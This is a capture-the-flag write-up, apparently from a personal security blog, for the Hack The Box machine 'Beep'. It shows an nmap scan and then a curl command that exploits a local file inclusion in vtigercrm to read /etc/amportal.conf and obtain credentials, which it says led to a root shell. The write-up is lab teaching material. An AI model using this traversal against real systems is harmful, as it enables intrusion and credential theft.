# **Beep**

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/709477fe-6646-4d5a-8197-8599f6e2442d)
## **Difficulty = Easy**

***

Running our nmap scan we have

```bash
# Nmap 7.94 scan initiated Mon Nov 27 18:50:10 2023 as: nmap -p- -sVC -v --min-rate=1000 -T4 -oN nmap.txt 10.129.229.183
Warning: 10.129.229.183 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.229.183
Host is up (0.15s latency).
Not shown: 65350 closed tcp ports (conn-refused), 169 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.129.229.183/
|_http-server-header: Apache/2.2.3 (CentOS)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            854/udp   status
|_  100024  1            857/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a:82b6:cf7e:1afa:5284:1c91:60c8:fbc8
|_SHA-1: 800a:c6e7:065e:1198:0187:c452:0d9b:18ef:e557:a09f
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2023-11-27T17:56:22+00:00; +4s from scanner time.
857/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: F3337C71F21F2D6F478E118940F48988
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 3s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 27 19:01:36 2023 -- 1 IP address (1 host up) scanned in 686.31 seconds
```

We couldn't access most of the `HTTP/HTTPS` ports with our browser so i decided to use `curl`


![](https://i.imgur.com/98qlIob.png)



Since we know that we can access port 443 with `curl`, let go ahead and run directory bruteforce



![](https://i.imgur.com/OH1WTVz.png)


Since nothing here, i decided to check out a public exploit written in perl and i found [this](https://www.exploit-db.com/exploits/37637), The script did not work, but reading the script, i saw the LFI endpoint and decided to use `curl` again

```bash
curl -vv "https://10.129.68.32//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" -k
```

Reading the output i found out some usernames like `asteriskuser`, `astrisk` but nothing seem to work, so i decided to try out root with the `FOP password`

![](https://i.imgur.com/8EjB9hn.png)


Hell yeah, we got shell as user `root`


![](https://i.imgur.com/icayuUG.png)

Have fun 🥇


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



